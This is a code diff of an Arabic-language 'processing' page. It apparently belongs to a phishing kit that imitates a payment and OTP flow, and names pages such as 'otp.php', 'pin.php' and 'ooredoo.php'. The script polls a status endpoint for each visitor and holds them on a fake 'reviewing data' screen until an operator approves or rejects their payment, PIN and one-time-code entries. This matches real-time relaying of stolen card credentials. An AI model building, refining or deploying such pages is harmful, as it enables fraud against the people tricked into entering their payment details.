@@ -5,43 +5,56 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري المعالجة...</title>
     <style>
-        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background-color: #ffffff; font-family: 'Cairo', sans-serif; }
-        .loader-container { display: flex; flex-direction: column; align-items: center; }
-        .spinner { width: 80px; height: 80px; border: 5px solid #f3f3f3; border-top: 5px solid #8b1538; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        .loader-wrap { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #333; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .logo { width: 120px; margin-bottom: 10px; }
-        .text { color: #333; font-weight: 600; }
+        .text { color: #333; font-weight: 600; font-size: 16px; }
     </style>
 </head>
 <body>
-<div class="loader-container">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo" class="logo">
+<div class="loader-wrap">
     <div class="spinner"></div>
-    <div class="text">جاري التحقق من البيانات...</div>
+    <div class="text" id="statusText">جاري معالجة طلبك...</div>
 </div>
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const visitorId = urlParams.get('visitor_id');
     const nextPage = urlParams.get('next');
+    const previousPage = urlParams.get('prev') || 'index.php';
+
+    // الصفحات التي تتطلب قرار المسؤول حصراً
+    const manualPages = ['otp.php', 'pin.php', 'ooredoo.php', 'otp_ooredoo.php', 'success.php'];
+    
+    // إذا كانت الصفحة الحالية هي الدفع أو ما بعدها، ننتظر قرار المسؤول
+    const isManual = previousPage.includes('payment.php') || 
+                     previousPage.includes('otp.php') || 
+                     previousPage.includes('pin.php') || 
+                     previousPage.includes('ooredoo.php');
 
     function checkStatus() {
-        fetch(`api/check_status.php?visitor_id=${visitorId}`)
-            .then(response => response.json())
+        fetch(`api/check_status.php?visitor_id=${visitorId}&v=${Date.now()}`)
+            .then(r => r.json())
             .then(data => {
                 if (data.status === 'approved') {
                     window.location.href = nextPage + "?visitor_id=" + visitorId;
                 } else if (data.status === 'rejected') {
-                    const prevPage = document.referrer.split('/').pop().split('?')[0] || 'index.php';
-                    window.location.href = prevPage + "?visitor_id=" + visitorId + "&error=1";
+                    window.location.href = previousPage + "?visitor_id=" + visitorId + "&error=1";
                 }
-            })
-            .catch(error => console.error('Error:', error));
+            });
     }
-    // الانتظار لمدة ثانيتين قبل بدء الفحص التلقائي
-    setTimeout(() => {
-        checkStatus();
+
+    if (isManual) {
+        // انتظار قرار المسؤول
+        document.getElementById('statusText').textContent = 'يرجى الانتظار، جاري مراجعة البيانات...';
         setInterval(checkStatus, 3000);
-    }, 2000);
+        checkStatus();
+    } else {
+        // انتقال تلقائي بعد ثانيتين بالضبط
+        setTimeout(() => {
+            window.location.href = nextPage + "?visitor_id=" + visitorId;
+        }, 2000);
+    }
 </script>
 </body>
 </html>
